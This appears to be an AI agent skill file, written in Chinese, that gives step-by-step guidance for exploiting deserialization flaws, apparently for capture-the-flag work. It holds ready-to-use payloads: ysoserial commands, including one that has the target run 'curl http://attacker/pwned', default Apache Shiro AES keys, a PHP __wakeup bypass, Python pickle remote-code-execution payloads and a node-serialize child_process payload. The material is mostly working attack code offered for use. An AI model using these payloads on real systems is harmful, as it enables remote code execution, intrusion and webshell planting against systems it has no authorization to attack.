---
name: deserialization-attack
description: 反序列化漏洞利用通法。Use when you find serialized data (Java/PHP/Python/Node) in cookies, parameters, or protocol traffic. Covers Java gadget chains (ysoserial), PHP unserialize, Python pickle, and Shiro/WebLogic/Spring specific attacks.
---

# 反序列化攻击通法

## 识别反序列化点

| 语言 | 特征 |
|---|---|
| **Java** | Base64 blob 以 `rO0AB` 开头(即 hex `AC ED 00 05`); 二进制 blob 在 cookie/参数里; Shiro `rememberMe` cookie |
| **PHP** | 参数值形如 `O:4:"User":2:{...}` 或 Base64 后解码有此格式 |
| **Python** | 参数值 Base64 解码以 `\x80\x03` / `\x80\x04` 开头(pickle protocol); Redis/Celery task 内容 |
| **Node.js** | `node-serialize` 库 + JSON 里有 `_$$ND_FUNC$$_` 标记 |

## Java 反序列化

### ysoserial 用法
```bash
# 生成 payload
java -jar ysoserial.jar CommonsCollections6 "curl http://attacker/pwned" > payload.bin
java -jar ysoserial.jar CommonsCollections6 "cat /flag" | base64 -w0

# 确认漏洞(安全探测,不执行命令):
java -jar ysoserial.jar URLDNS "http://TOKEN.dnslog.cn" | base64 -w0
# DNS 命中 = 确认有反序列化

# 常用 chain(按命中率):
# CommonsCollections6 > CommonsCollections1 > Groovy1 > Spring1 > Jdk7u21
```

### Apache Shiro rememberMe (CVE-2016-4437)
```bash
# 检测: 请求带无效 session → 响应有 Set-Cookie: rememberMe=deleteMe
# 默认 AES key:
kPH+bIxk5D2deZiIxcaaaA==    # 最常见
wGJlpLanyXlVB1LUUWolBg==
4AvVhmFLUs0KTA3Kprsdag==

# 攻击: ysoserial payload → AES-CBC 加密(key+随机IV) → Base64 → 设为 rememberMe cookie
```

### WebLogic T3/IIOP
```bash
# 检测: nmap -p 7001 target → banner 含 "T3" / "WebLogic"
# 攻击: 直接发序列化对象到 T3 端口
```

## PHP 反序列化

```php
// 检测: 参数值形如 O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
// 攻击: 构造含 __wakeup/__destruct 的恶意对象
// 常见 gadget: 文件写入(__destruct 写 webshell) / 命令执行

// 绕过 __wakeup (CVE-2016-7124):
// 把属性数量改大: O:4:"User":99:{...} → __wakeup 不被调用
```

## Python pickle 反序列化

```python
# 检测: Base64 参数解码后以 \x80\x03 或 \x80\x04 开头
# 攻击:
import pickle, os, base64

class Exploit:
    def __reduce__(self):
        return (os.system, ('cat /flag',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
# 把 payload 提交到反序列化点

# 简洁版(不需要 Python 类):
# pickle opcode 直接构造:
payload = base64.b64encode(b"cos\nsystem\n(S'cat /flag'\ntR.").decode()
```

## Node.js node-serialize

```javascript
// 检测: JSON 数据含 _$$ND_FUNC$$_ 标记
// 攻击: 构造 IIFE (立即执行函数)
{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('cat /flag')}()"}
```

## 铁律

- **先用 URLDNS/DNSLog 确认**,再上 RCE chain — 避免盲打
- Java 反序列化优先试 CommonsCollections6(兼容性最好)
- Shiro 默认 key 只有几个,全试一遍(30 秒)
- Python pickle 看到 Base64 blob → 先 decode 看开头字节确认
- 反序列化通常在 cookie/session/参数里,**别忘了检查 HTTP header**
